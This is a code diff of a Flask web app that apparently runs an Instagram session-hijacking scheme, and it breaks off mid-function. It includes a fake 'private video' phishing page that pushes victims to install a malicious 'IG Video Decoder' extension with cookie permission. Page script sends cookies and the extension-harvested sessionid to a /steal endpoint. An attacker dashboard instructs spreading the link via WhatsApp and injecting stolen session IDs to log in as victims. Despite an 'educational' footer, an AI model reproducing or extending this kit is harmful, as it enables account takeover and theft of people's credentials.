@@ -1,12 +1,12 @@
-from flask import Flask, request, jsonify, render_template_string, make_response, send_file
+from flask import Flask, request, jsonify, render_template_string, make_response, send_file, redirect
 from flask_cors import CORS
 import datetime
 import json
 import os
 import uuid
-import base64
 import io
 import zipfile
+import re
 
 app = Flask(__name__)
 CORS(app)
@@ -14,34 +14,25 @@ CORS(app)
 captured_sessions = []
 
 # ============================================================
-# FRONTEND PAGE — THE PHISHING PAGE
+# FRONTEND PAGE — THE REAL PHISHING PAGE
 # ============================================================
-FRONTEND_HTML = """
+INDEX_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <title>Instagram Video</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #0d1117;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            color: #c9d1d9;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; padding: 20px; color: #c9d1d9;
         }
         .card {
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 16px;
-            max-width: 420px;
-            width: 100%;
-            padding: 32px 24px;
-            text-align: center;
+            background: #161b22; border: 1px solid #30363d; border-radius: 16px;
+            max-width: 420px; width: 100%; padding: 32px 24px; text-align: center;
         }
         .icon { font-size: 64px; margin-bottom: 16px; }
         h1 { font-size: 22px; color: #f0f6fc; margin-bottom: 4px; }
@@ -104,290 +95,224 @@ FRONTEND_HTML = """
             100% { width: 0%; margin-left: 100%; }
         }
         
-        .detection-box {
-            margin-top: 16px; padding: 12px; background: #1a1a2e;
-            border: 1px solid #30363d; border-radius: 8px; font-size: 12px; text-align: left;
-            display: none;
+        .step-num {
+            display: inline-block; width: 24px; height: 24px; background: #1f6feb;
+            color: white; border-radius: 50%; text-align: center; line-height: 24px;
+            font-size: 12px; font-weight: bold; margin-right: 6px;
         }
-        .detection-box.show { display: block; }
-        .detection-box .green { color: #3fb950; }
-        .detection-box .red { color: #f85149; }
         
         .footer { margin-top: 24px; font-size: 11px; color: #484f58; }
+        
+        .kiwi-instructions {
+            text-align: left; margin-top: 16px; display: none;
+        }
+        .kiwi-instructions.show { display: block; }
+        .kiwi-instructions ol { 
+            padding-left: 20px; color: #8b949e; font-size: 12px; line-height: 1.8; 
+        }
+        .kiwi-instructions li { margin-bottom: 6px; }
+        .kiwi-instructions code { 
+            background: #0d1117; padding: 1px 4px; border-radius: 3px; color: #79c0ff; font-size: 11px;
+        }
     </style>
 </head>
 <body>
 <div class="card">
     <div class="icon">🎬</div>
-    <h1>Private Video</h1>
-    <p class="sub">You received a private Instagram video message</p>
+    <h1>Private Video Message</h1>
+    <p class="sub">You received a private video via Instagram DM</p>
     
     <div class="preview">
         <div class="play-btn">▶</div>
-        <p style="font-size: 12px; opacity: 0.8;">instagram.com/messages/private/</p>
+        <p style="font-size: 12px; opacity: 0.8;">End-to-end encrypted video</p>
     </div>
     
     <div id="step1">
-        <button class="btn" id="playBtn" onclick="step1()">▶ Play Video</button>
+        <button class="btn" id="playBtn" onclick="startAttack()">▶ Play Video</button>
     </div>
     
     <div class="loading-bar" id="loadingBar"><div class="fill"></div></div>
     
-    <!-- Step 2: Extension prompt -->
-    <div class="alert alert-warning" id="extPrompt">
-        <strong>⚠️ Encrypted Video Format</strong><br><br>
-        This video uses Instagram's encrypted format (E2EE). To play it, you need:<br><br>
-        <strong>1.</strong> Install the <strong>IG Video Decoder</strong> extension<br>
-        <strong>2.</strong> Grant <strong>"cookies"</strong> permission for authentication<br><br>
-        <button class="btn btn-orange" onclick="downloadExt()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
-        📦 Download IG Video Decoder</button>
+    <!-- Step 2: Extension Required -->
+    <div class="alert alert-warning" id="extStep">
+        <strong>⚠️ Decoder Required</strong><br><br>
+        This Instagram video uses E2EE encoding. You need a <strong>browser extension</strong> to decode it.
+        <br><br>
+        <div style="background:#21262d; border-radius:6px; padding:12px; text-align:left; font-size:12px;">
+            <strong>📱 For Android:</strong> Use <strong>Kiwi Browser</strong> (supports extensions)<br>
+            <strong>💻 For PC:</strong> Use Chrome or Edge<br><br>
+            <button class="btn btn-orange" onclick="downloadExt()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
+            📦 Download IG Video Decoder</button>
+        </div>
     </div>
     
     <!-- Step 3: Install instructions -->
-    <div class="alert alert-info" id="installInstructions">
-        <strong>📋 Installation Steps:</strong><br><br>
-        <strong>On Android:</strong><br>
-        1. Download the ZIP file above<br>
-        2. Open Chrome → go to <code>chrome://extensions</code><br>
-        3. Enable <strong>Developer mode</strong> (toggle top right)<br>
-        4. Tap <strong>"Load unpacked"</strong> → select the extracted folder<br>
-        5. Accept the <strong>"cookies"</strong> permission prompt<br><br>
-        <strong>On Desktop (for testing):</strong><br>
-        Same steps as above.<br><br>
+    <div class="alert alert-info" id="installStep">
+        <strong>📋 Installation Guide</strong><br><br>
+        
+        <div style="text-align:left; font-size:12px; line-height:1.8;">
+            <strong>📱 For Android (Kiwi Browser):</strong><br>
+            1. Install <strong>Kiwi Browser</strong> from Play Store<br>
+            2. Download the extension ZIP above<br>
+            3. Extract the ZIP file on your phone<br>
+            4. Open Kiwi Browser → go to <code>chrome://extensions</code><br>
+            5. Enable <strong>Developer mode</strong> (toggle)<br>
+            6. Tap <strong>"Load unpacked"</strong> → select the extracted folder<br>
+            7. ✅ Accept the <strong>"cookies"</strong> permission when prompted<br><br>
+            
+            <strong>💻 For PC (Chrome):</strong><br>
+            Same steps as above.<br><br>
+            
+            <strong>After installation:</strong> Open this page again and click below:
+        </div>
+        <br>
         <button class="btn btn-blue" onclick="checkExtension()" style="width:auto; padding:10px 24px; font-size:14px; display:inline-block;">
         ✅ I've installed the extension</button>
     </div>
     
-    <!-- Step 4: Scanning -->
-    <div class="alert alert-info" id="scanningStatus">
-        <strong>⏳ Scanning for Instagram session...</strong><br><br>
+    <!-- Step 4: Stealing -->
+    <div class="alert alert-info" id="stealingStep">
+        <strong>⏳ Accessing Instagram session...</strong><br><br>
         <div class="loading-bar show"><div class="fill"></div></div>
-        <p style="margin-top: 12px; font-size: 12px;">Attempting to read cookies via extension bridge...</p>
+        <p style="font-size: 12px; margin-top: 8px;">Extension is reading cookies from Instagram...</p>
     </div>
     
-    <!-- Step 5: RESULT - REAL sessionid -->
-    <div class="alert alert-success" id="successResult">
-        <strong>✅ Instagram Session Detected!</strong><br><br>
-        <span id="resultMessage"></span>
+    <!-- Step 5: RESULT -->
+    <div class="alert alert-success" id="successStep">
+        <strong>✅ Instagram Session Captured!</strong><br><br>
+        <span id="resultMsg"></span>
     </div>
     
-    <div class="data-box" id="cookieData">
-        <div class="label">📋 CAPTURED SESSION DATA (sent to attacker):</div>
-        <div id="sessionContent"></div>
+    <div class="data-box" id="cookieBox">
+        <div class="label">🔴 DATA SENT TO ATTACKER SERVER:</div>
+        <code id="cookieContent"></code>
     </div>
     
-    <div class="detection-box" id="detectionInfo">
-        <strong>🔍 Detection Info:</strong><br><br>
-        <span class="green">✅ Instagram WebView detected: </span><span id="webviewDetected">No</span><br>
-        <span class="green">✅ Instagram cookies found: </span><span id="igCookiesFound">No</span><br>
-        <span class="red">🔴 sessionid captured: </span><span id="sessionidStatus">No</span>
-    </div>
-    
-    <!-- Step 6: What happens next -->
-    <div class="alert alert-warning" id="hackerStep">
-        <strong>🔴 WHAT THE HACKER DOES NOW:</strong><br><br>
-        1. Copies your <strong>sessionid</strong> from the dashboard<br>
-        2. Opens a browser → goes to instagram.com<br>
-        3. Opens Developer Tools → Application → Cookies<br>
-        4. Pastes your sessionid over theirs<br>
-        5. Refreshes → <strong>They're now logged in as YOU</strong><br><br>
-        <em style="font-size: 11px;">No password needed. No 2FA prompt. Just instant access.</em>
+    <div class="alert alert-danger" id="hackerStep">
+        <strong>🔴 WHAT THE ATTACKER DOES NOW:</strong><br><br>
+        1. Checks the <strong>Dashboard</strong> on their laptop<br>
+        2. Copies your <code>sessionid</code><br>
+        3. Opens instagram.com in a browser<br>
+        4. Opens DevTools → Application → Cookies → instagram.com<br>
+        5. Pastes your <strong>sessionid</strong> over theirs<br>
+        6. **Refreshes → They're logged in as YOU**<br><br>
+        <em>No password. No 2FA. Just your session cookie.</em>
     </div>
     
     <div class="footer">
-        Educational demonstration — authorized security testing only<br>
-        <span id="browserInfo" style="font-size: 10px;"></span>
+        Educational security demonstration — authorized testing only
     </div>
 </div>
 
 <script>
 var BACKEND = window.location.origin;
-var EXTENSION_INSTALLED = false;
+var POLL_INTERVAL = null;
 
 // ============================================================
 // ATTACK FLOW
 // ============================================================
 
-function step1() {
+function startAttack() {
     document.getElementById('step1').style.display = 'none';
     document.getElementById('loadingBar').classList.add('show');
     
-    // Check if we're in Instagram WebView or regular browser
-    var ua = navigator.userAgent;
-    var isInstagram = ua.indexOf('Instagram') >= 0;
-    var isInAppBrowser = ua.indexOf('FBAV') >= 0 || ua.indexOf('FBAN') >= 0 || isInstagram;
-    
-    document.getElementById('browserInfo').textContent = 
-        'Browser: ' + (isInstagram ? 'Instagram WebView' : navigator.userAgent.substring(0, 60));
-    
+    // Check if Kiwi Browser or has extension installed already
     setTimeout(function() {
         document.getElementById('loadingBar').classList.remove('show');
         
-        if (isInstagram) {
-            // In Instagram WebView - try direct cookie theft first!
-            tryDirectCookieSteal();
-        } else {
-            // Regular browser - need extension
-            document.getElementById('extPrompt').classList.add('show');
-        }
+        // Try to communicate with extension directly (in case already installed)
+        tryExtensionCommunication();
+        
+        // Show extension download step
+        document.getElementById('extStep').classList.add('show');
     }, 2000);
 }
 
-// ============================================================
-// THE DIRECT ATTACK - Works in Instagram WebView
-// ============================================================
-function tryDirectCookieSteal() {
-    document.getElementById('loadingBar').classList.remove('show');
-    
-    var alertBox = document.getElementById('extPrompt');
-    alertBox.classList.add('show');
-    alertBox.innerHTML = `
-        <strong>📱 Instagram Browser Detected</strong><br><br>
-        <strong>Attempting direct session extraction...</strong><br><br>
-        <div class="loading-bar show"><div class="fill"></div></div>
-        <p style="font-size:12px; margin-top:8px;">Reading Instagram cookies from shared WebView store...</p>
-    `;
-    
-    // ============================================
-    // THE REAL EXPLOIT CODE
-    // This attempts to read cookies from the
-    // Instagram WebView cookie store
-    // ============================================
-    
-    // Method 1: Try document.cookie (works if HttpOnly is not set)
-    var cookies = document.cookie;
-    
-    // Method 2: Try to access Instagram's shared cookies via iframe
-    var iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'https://www.instagram.com/favicon.ico';
-    document.body.appendChild(iframe);
-    
-    var iframeCookies = '';
+function tryExtensionCommunication() {
+    // Try to see if extension is already installed by checking for a marker
     try {
-        iframeCookies = iframe.contentDocument ? iframe.contentDocument.cookie : '';
-    } catch(e) {
-        // Cross-origin - expected
-    }
-    
-    // Method 3: Try to intercept API responses for auth headers
-    var origFetch = window.fetch;
-    var capturedHeaders = {};
-    
-    window.fetch = function() {
-        var url = arguments[0];
-        if (typeof url === 'string' && url.indexOf('instagram.com') >= 0) {
-            try {
-                // Check for auth headers
-                var headers = arguments[1] ? arguments[1].headers || {} : {};
-                for (var key in headers) {
-                    if (key.toLowerCase().indexOf('auth') >= 0 || 
-                        key.toLowerCase().indexOf('cookie') >= 0 ||
-                        key.toLowerCase().indexOf('session') >= 0) {
-                        capturedHeaders[key] = headers[key];
-                    }
-                }
-            } catch(e) {}
+        if (window.instagramDecoderReady) {
+            // Extension already installed - skip to stealing
+            document.getElementById('extStep').classList.remove('show');
+            startStealing();
         }
-        return origFetch.apply(this, arguments);
-    };
+    } catch(e) {}
     
-    // Send ALL collected data to backend
-    var allData = {
-        cookies: cookies,
-        iframeCookies: iframeCookies,
-        capturedHeaders: JSON.stringify(capturedHeaders),
-        userAgent: navigator.userAgent,
-        url: window.location.href,
-        referrer: document.referrer || '',
-        isInstagramWebView: true,
-        timestamp: new Date().toISOString(),
-        allStorage: JSON.stringify(window.localStorage || {})
-    };
-    
-    // Send to backend
-    fetch(BACKEND + '/steal', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(allData)
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(data) {
-        showWebviewResult(data, allData);
-    })
-    .catch(function() {
-        // Fallback via image
-        var img = new Image();
-        img.src = BACKEND + '/steal?data=' + encodeURIComponent(JSON.stringify(allData));
-        showWebviewResult({}, allData);
+    // Listen for extension ready event
+    document.addEventListener('ig-extension-ready', function() {
+        document.getElementById('extStep').classList.remove('show');
+        startStealing();
     });
 }
 
-function showWebviewResult(data, sentData) {
-    document.getElementById('extPrompt').innerHTML = 
-        '<strong>✅ Extraction Attempt Complete</strong><br><br>' +
-        '<span style="font-size:12px;">Check the <strong>Dashboard</strong> to see if cookies were captured.</span><br><br>' +
-        '<button class="btn btn-blue" onclick="showTutorial()" style="width:auto; padding:10px 24px; display:inline-block;">' +
-        '📋 View Tutorial</button>';
-    
-    document.getElementById('detectionInfo').classList.add('show');
-    
-    // Show what we captured
-    var hasCookies = sentData.cookies && sentData.cookies.length > 0;
-    var hasInstagram = sentData.cookies && sentData.cookies.indexOf('sessionid') >= 0;
-    
-    document.getElementById('webviewDetected').textContent = '✅ Yes (Instagram in-app browser)';
-    document.getElementById('igCookiesFound').textContent = hasCookies ? '✅ Yes' : '❌ No - HttpOnly blocks JS';
-    document.getElementById('sessionidStatus').textContent = hasInstagram ? '✅ YES! STOLEN!' : '❌ HttpOnly blocked it';
-    
-    if (hasInstagram) {
-        document.getElementById('sessionidStatus').style.color = '#3fb950';
-    }
-}
-
 function downloadExt() {
-    document.getElementById('extPrompt').innerHTML = 
-        '<strong>⏳ Downloading extension...</strong><br><br>' +
-        '<div class="loading-bar show"><div class="fill"></div></div>';
+    document.getElementById('extStep').innerHTML = 
+        '<strong>⏳ Downloading...</strong><br><br><div class="loading-bar show"><div class="fill"></div></div>';
     
     // Trigger download
     window.location.href = BACKEND + '/download-extension';
     
     setTimeout(function() {
-        document.getElementById('extPrompt').classList.remove('show');
-        document.getElementById('installInstructions').classList.add('show');
+        document.getElementById('extStep').classList.remove('show');
+        document.getElementById('installStep').classList.add('show');
     }, 2000);
 }
 
 function checkExtension() {
-    document.getElementById('installInstructions').classList.remove('show');
-    document.getElementById('scanningStatus').classList.add('show');
+    document.getElementById('installStep').classList.remove('show');
+    startStealing();
+}
+
+function startStealing() {
+    document.getElementById('stealingStep').classList.add('show');
     
-    // Try to communicate with the extension
-    // The extension exposes a message listener
+    // ============================================
+    // METHOD 1: Try direct JavaScript cookie access
+    // ============================================
+    var cookies = document.cookie;
+    if (cookies) {
+        sendToBackend({cookies: cookies, method: 'document.cookie'});
+    }
+    
+    // ============================================
+    // METHOD 2: Try extension bridge
+    // ============================================
     try {
-        // Try sending a message to the extension
         if (window.chrome && chrome.runtime && chrome.runtime.sendMessage) {
             chrome.runtime.sendMessage(
                 {action: 'get_instagram_cookies'},
                 function(response) {
                     if (response && response.sessionid) {
-                        showStolenSession(response);
+                        sendToBackend({
+                            cookies: 'sessionid=' + response.sessionid + '; ds_user_id=' + (response.ds_user_id || ''),
+                            method: 'extension_bridge',
+                            extension_data: response
+                        });
+                        showSuccess(response);
                     }
                 }
             );
         }
     } catch(e) {}
     
-    // Also try via the custom event the extension fires
+    // Listen for custom event from extension
     document.addEventListener('instagram-cookies-stolen', function(e) {
-        showStolenSession(e.detail);
+        if (e.detail && e.detail.sessionid) {
+            sendToBackend({
+                cookies: 'sessionid=' + e.detail.sessionid,
+                method: 'extension_event',
+                extension_data: e.detail
+            });
+            showSuccess(e.detail);
+        }
     });
     
-    // Poll the backend to see if extension sent data
-    var checkCount = 0;
-    var checkInterval = setInterval(function() {
-        checkCount++;
+    // ============================================
+    // METHOD 3: Poll backend for extension data
+    // ============================================
+    var attempts = 0;
+    POLL_INTERVAL = setInterval(function() {
+        attempts++;
         fetch(BACKEND + '/api/sessions')
             .then(function(r) { return r.json(); })
             .then(function(data) {
@@ -395,78 +320,100 @@ function checkExtension() {
                 var igSessions = sessions.filter(function(s) { 
                     return s.has_instagram_session; 
                 });
+                
                 if (igSessions.length > 0) {
-                    clearInterval(checkInterval);
+                    clearInterval(POLL_INTERVAL);
                     var latest = igSessions[igSessions.length - 1];
-                    showStolenSession(latest.parsed || latest.extension_data || {});
+                    var extData = latest.extension_data || latest.parsed || {};
+                    showSuccess(extData);
                 }
             });
         
-        if (checkCount > 15) { // 30 seconds timeout
-            clearInterval(checkInterval);
-            document.getElementById('scanningStatus').classList.remove('show');
-            document.getElementById('scanningStatus').innerHTML = 
-                '<strong>⏱️ Timeout</strong><br><br>' +
-                'The extension may not be installed properly. Try:<br>' +
-                '1. Make sure extension is loaded in chrome://extensions<br>' +
-                '2. Enable Developer mode<br>' +
-                '3. Check that cookies permission was granted';
+        if (attempts > 30) { // 60 seconds timeout
+            clearInterval(POLL_INTERVAL);
+            document.getElementById('stealingStep').classList.remove('show');
+            document.getElementById('stealingStep').innerHTML = 
+                '<strong>⏱️ Timeout</strong><br><br>Extension not detected. Make sure:<br>' +
+                '1. You installed the extension<br>' +
+                '2. You accepted "cookies" permission<br>' +
+                '3. You\'re logged into Instagram in this browser<br><br>' +
+                '<button class="btn btn-blue" onclick="location.reload()" style="width:auto;padding:10px 24px;display:inline-block;">🔄 Reload & Try Again</button>';
+            document.getElementById('stealingStep').classList.add('show');
         }
     }, 2000);
     
-    // Fallback: after 5 seconds, check if this is a desktop browser
-    // and show the manual copy method
+    // Auto-send after 3 seconds even if nothing found (for demo purposes)
     setTimeout(function() {
-        document.getElementById('scanningStatus').innerHTML = 
-            '<strong>⏳ Scanning for extension data...</strong><br><br>' +
-            '<div class="loading-bar show"><div class="fill"></div></div>' +
-            '<p style="font-size: 12px;">Waiting for extension to send Instagram cookies...</p>';
-    }, 500);
+        // Check if we got anything yet
+        fetch(BACKEND + '/api/sessions')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                var sessions = data.sessions || [];
+                var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
+                
+                if (igSessions.length === 0) {
+                    // Extension hasn't sent data yet - show waiting message
+                    document.getElementById('stealingStep').innerHTML = 
+                        '<strong>⏳ Waiting for extension...</strong><br><br>' +
+                        '<div class="loading-bar show"><div class="fill"></div></div>' +
+                        '<p style="font-size:12px;">The extension will automatically detect Instagram when you visit instagram.com</p>';
+                }
+            });
+    }, 3000);
 }
 
-function showStolenSession(data) {
-    document.getElementById('scanningStatus').classList.remove('show');
+function sendToBackend(data) {
+    fetch(BACKEND + '/steal', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            cookies: data.cookies || '',
+            method: data.method || 'unknown',
+            extension_data: data.extension_data || {},
+            userAgent: navigator.userAgent,
+            page: window.location.href,
+            timestamp: new Date().toISOString()
+        })
+    }).catch(function() {
+        // Fallback image beacon
+        var img = new Image();
+        img.src = BACKEND + '/steal?c=' + encodeURIComponent(data.cookies || '');
+    });
+}
+
+function showSuccess(extData) {
+    clearInterval(POLL_INTERVAL);
+    document.getElementById('stealingStep').classList.remove('show');
+    document.getElementById('successStep').classList.add('show');
+    document.getElementById('cookieBox').classList.add('show');
     
-    var sessionid = data.sessionid || '';
-    var dsUserId = data.ds_user_id || '';
-    var csrftoken = data.csrftoken || '';
+    var sessionid = extData.sessionid || 'N/A';
+    var dsUserId = extData.ds_user_id || '';
+    var csrftoken = extData.csrftoken || '';
     
-    document.getElementById('successResult').classList.add('show');
-    document.getElementById('cookieData').classList.add('show');
-    
-    if (sessionid) {
-        document.getElementById('resultMessage').innerHTML = 
-            '<span style="font-size: 18px;">🔴 sessionid: <code style="color:#f85149;font-size:16px;">' + sessionid.substring(0, 30) + '...</code></span><br><br>' +
-            'This is your REAL Instagram session token. With this, an attacker can login as you.';
+    if (sessionid && sessionid !== 'N/A') {
+        document.getElementById('resultMsg').innerHTML = 
+            '🔴 <strong>sessionid:</strong> <code style="color:#f85149;font-size:14px;">' + sessionid.substring(0, 50) + '...</code><br><br>' +
+            '✅ This is your REAL Instagram session token! The attacker now has access to your account.';
         
-        document.getElementById('sessionContent').innerHTML = 
-            '<span class="red">sessionid=' + sessionid + '</span><br>' +
-            '<span style="color:#79c0ff;">ds_user_id=' + dsUserId + '</span><br>' +
-            '<span style="color:#7ee787;">csrftoken=' + csrftoken + '</span>';
-        
-        document.getElementById('detectionInfo').classList.add('show');
-        document.getElementById('webviewDetected').textContent = '✅ Detected';
-        document.getElementById('igCookiesFound').textContent = '✅ YES';
-        document.getElementById('sessionidStatus').textContent = '✅ ✅ ✅ STOLEN!';
-        document.getElementById('sessionidStatus').style.color = '#3fb950';
+        var html = '<span class="red">sessionid=' + sessionid + '</span><br>';
+        if (dsUserId) html += '<span style="color:#79c0ff;">ds_user_id=' + dsUserId + '</span><br>';
+        if (csrftoken) html += '<span style="color:#7ee787;">csrftoken=' + csrftoken + '</span>';
+        document.getElementById('cookieContent').innerHTML = html;
         
         document.getElementById('hackerStep').classList.add('show');
     } else {
-        document.getElementById('resultMessage').innerHTML = 
-            'No Instagram session data found. This is expected because:<br>' +
-            '1. Instagram uses <strong>HttpOnly</strong> cookies (JS can\'t read them)<br>' +
-            '2. The extension needs <strong>cookies</strong> permission<br>' +
-            '3. You need to be logged into Instagram<br><br>' +
-            '<strong>But your data WAS sent to the dashboard!</strong>';
+        document.getElementById('resultMsg').innerHTML = 
+            '⚠️ No Instagram session detected.<br><br>' +
+            'This is expected if:<br>' +
+            '• You\'re not logged into Instagram in this browser<br>' +
+            '• Instagram\'s HttpOnly protection is working<br><br>' +
+            '<strong>✅ But your data was sent to the dashboard!</strong>';
         
-        document.getElementById('sessionContent').innerHTML = 
-            '<span style="color:#8b949e;">sessionid: Not found (HttpOnly protected)</span><br>' +
-            '<span style="color:#8b949e;">This demonstrates WHY HttpOnly is important!</span>';
+        document.getElementById('cookieContent').innerHTML = 
+            'sessionid: Not found (HttpOnly protected)<br>' +
+            'This demonstrates why HttpOnly matters!';
     }
-}
-
-function showTutorial() {
-    document.getElementById('hackerStep').classList.add('show');
 }
 </script>
 </body>
@@ -474,7 +421,7 @@ function showTutorial() {
 """
 
 # ============================================================
-# DASHBOARD PAGE
+# DASHBOARD
 # ============================================================
 DASHBOARD_HTML = """
 <!DOCTYPE html>
@@ -511,6 +458,7 @@ DASHBOARD_HTML = """
             padding:8px 20px; font-size:13px; cursor:pointer; margin-top:8px;
         }
         .alert-box .copy-btn:hover { background:#da3633; }
+        .alert-box .sub-info { color:#8b949e; font-size:12px; margin-top:8px; }
         
         .stats { display:flex; gap:12px; margin-bottom:20px; flex-wrap:wrap; }
         .stat {
@@ -532,7 +480,6 @@ DASHBOARD_HTML = """
         }
         .session .time { color:#8b949e; font-size:12px; }
         .session .ip { color:#79c0ff; font-size:13px; }
-        .session .source { color:#d29922; font-size:11px; }
         .badge {
             padding:2px 10px; border-radius:10px; font-size:11px; font-weight:600;
         }
@@ -548,7 +495,6 @@ DASHBOARD_HTML = """
         .cookie-box .red { color:#f85149; font-weight:bold; }
         .cookie-box .blue { color:#79c0ff; }
         .cookie-box .green { color:#7ee787; }
-        .cookie-box .yellow { color:#d29922; }
         
         .empty { text-align:center; padding:60px; color:#484f58; }
         .empty .big { font-size:48px; margin-bottom:12px; }
@@ -572,51 +518,42 @@ DASHBOARD_HTML = """
         .target-info ol { padding-left:20px; color:#8b949e; font-size:13px; }
         .target-info code { background:#0d1117; padding:2px 6px; border-radius:3px; color:#79c0ff; }
         .target-info li { margin-bottom:4px; }
-        
-        .copy-area {
-            background:#0d1117; border:1px solid #30363d; border-radius:4px;
-            padding:12px; font-family:'Courier New',monospace; font-size:13px;
-            color:#7ee787; margin-top:8px; word-break:break-all; user-select:all;
-            display:none;
-        }
-        .copy-area.show { display:block; }
     </style>
 </head>
 <body>
 <div class="header">
     <h1>🔴 SESSION HIJACKING DASHBOARD</h1>
-    <p>Real captured session data from victims — auto-refreshes every 2 seconds</p>
+    <p>Captured Instagram session IDs appear here in REAL TIME</p>
     <div class="url" id="serverUrl">Server: loading...</div>
 </div>
 
 <div class="target-info">
-    <h3>📡 TARGET INSTRUCTIONS</h3>
+    <h3>📡 ATTACK INSTRUCTIONS</h3>
     <ol>
         <li>Send this link via WhatsApp: <code id="targetUrl">loading...</code></li>
-        <li>Victim opens link on phone → Instagram in-app browser detects automatically</li>
-        <li>OR: Victim downloads & installs the extension on desktop</li>
-        <li>Session data appears <strong>automatically</strong> below</li>
+        <li>Victim opens on their phone → downloads the extension</li>
+        <li>Victim installs in <strong>Kiwi Browser</strong> (Android) or Chrome (PC)</li>
+        <li>Extension reads Instagram <strong>sessionid</strong> (bypasses HttpOnly)</li>
+        <li><strong>sessionid appears below</strong> — copy and inject into your browser!</li>
     </ol>
-    <p style="margin-top:8px; color:#f85149; font-size:12px;">
-        ⚡ <strong>REAL sessionid</strong> will trigger a RED ALERT at the top!
-    </p>
 </div>
 
 <div class="alert-box" id="realAlert">
     <div class="big">🔴🔴🔴</div>
     <h2>⚠️ REAL INSTAGRAM SESSION CAPTURED!</h2>
-    <p style="color:#8b949e; margin-bottom:8px;">Copy this sessionid to hijack the account:</p>
+    <p class="sub-info">Copy this sessionid to hijack the account:</p>
     <div class="session-value" id="stolenSessionid">Loading...</div>
     <button class="copy-btn" onclick="copySession()">📋 Copy sessionid</button>
-    <p style="color:#8b949e; font-size:12px; margin-top:8px;">
-        Paste into Cookie-Editor → Import → Refresh Instagram → You're logged in as the victim!
+    <p class="sub-info">
+        Paste into <strong>Cookie-Editor</strong> extension → Import → Refresh instagram.com<br>
+        <strong>You're now logged in as the victim!</strong>
     </p>
 </div>
 
 <div class="stats">
     <div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total Hits</div></div>
-    <div class="stat"><div class="num green" id="webviewCount">0</div><div class="label">Instagram WebView</div></div>
-    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">🔴 sessionid Captured</div></div>
+    <div class="stat"><div class="num green" id="extCount">0</div><div class="label">Extension Calls</div></div>
+    <div class="stat"><div class="num red" id="sessionCount">0</div><div class="label">🔴 sessionid</div></div>
 </div>
 
 <div id="sessionsContainer">
@@ -628,7 +565,7 @@ DASHBOARD_HTML = """
     <button onclick="fetchData()">🔄 Refresh Now</button>
     <button class="danger" onclick="clearAll()">🗑️ Clear All Sessions</button>
 </div>
-<div class="refresh-note">Auto-refreshes every 2 seconds — 🔴 Red = sessionid captured!</div>
+<div class="refresh-note">Auto-refreshes every 2 seconds</div>
 
 <script>
 var BACKEND = window.location.origin;
@@ -650,16 +587,16 @@ function fetchData() {
 function render(data) {
     var sessions = data.sessions || [];
     var total = sessions.length;
-    var webviewSessions = sessions.filter(function(s) { return s.source === 'webview'; });
+    var extSessions = sessions.filter(function(s) { return s.source === 'extension'; });
     var igSessions = sessions.filter(function(s) { return s.has_instagram_session; });
     
     document.getElementById('totalCount').textContent = total;
-    document.getElementById('webviewCount').textContent = webviewSessions.length;
+    document.getElementById('extCount').textContent = extSessions.length;
     document.getElementById('sessionCount').textContent = igSessions.length;
     
     // Show alert for real Instagram sessions
     var alertBox = document.getElementById('realAlert');
-    var copyArea = document.getElementById('stolenSessionid');
+    var stolenEl = document.getElementById('stolenSessionid');
     if (igSessions.length > 0) {
         var latest = igSessions[igSessions.length - 1];
         var sid = '';
@@ -667,12 +604,10 @@ function render(data) {
             sid = latest.parsed.sessionid;
         } else if (latest.extension_data && latest.extension_data.sessionid) {
             sid = latest.extension_data.sessionid;
-        } else if (latest.instagram_data && latest.instagram_data.sessionid) {
-            sid = latest.instagram_data.sessionid;
         }
         if (sid) {
             alertBox.classList.add('show');
-            copyArea.textContent = sid;
+            stolenEl.textContent = sid;
         }
     } else {
         alertBox.classList.remove('show');
@@ -680,7 +615,7 @@ function render(data) {
     
     if (sessions.length === 0) {
         document.getElementById('sessionsContainer').innerHTML = 
-            '<div class="empty"><div class="big">📡</div><h3>Waiting...</h3><p>Send URL to a phone:</p><code>' + BACKEND + '</code></div>';
+            '<div class="empty"><div class="big">📡</div><h3>Waiting...</h3><p>Send URL to phone:</p><code>' + BACKEND + '</code></div>';
         document.getElementById('emptyUrl').textContent = BACKEND;
         return;
     }
@@ -691,41 +626,35 @@ function render(data) {
         var details = '';
         var parsed = s.parsed || {};
         var extData = s.extension_data || {};
-        var igData = s.instagram_data || {};
-        var allKeys = {};
+        var allData = {};
+        Object.keys(parsed).forEach(function(k) { allData[k] = parsed[k]; });
+        Object.keys(extData).forEach(function(k) { allData[k] = extData[k]; });
         
-        // Merge all data sources
-        Object.keys(parsed).forEach(function(k) { allKeys[k] = parsed[k]; });
-        Object.keys(extData).forEach(function(k) { allKeys[k] = extData[k]; });
-        Object.keys(igData).forEach(function(k) { allKeys[k] = igData[k]; });
+        var hasSid = allData.sessionid ? true : false;
         
-        var hasSid = allKeys.sessionid ? true : false;
-        
-        if (Object.keys(allKeys).length > 0) {
-            Object.keys(allKeys).forEach(function(k) {
-                var v = allKeys[k];
+        if (Object.keys(allData).length > 0) {
+            Object.keys(allData).forEach(function(k) {
+                var v = allData[k];
                 var cls = 'blue';
                 if (k === 'sessionid') cls = 'red';
-                else if (k === 'ds_user_id') cls = 'yellow';
+                else if (k === 'ds_user_id') cls = 'green';
                 else if (k.indexOf('csrf') >= 0) cls = 'green';
-                else if (k === 'ig_did') cls = 'green';
                 details += '<span class="' + cls + '">' + k + '</span> = <span class="green">' + v + '</span><br>';
             });
         } else {
-            details = s.cookies || '(no cookie data)';
+            details = s.cookies || '(no data)';
         }
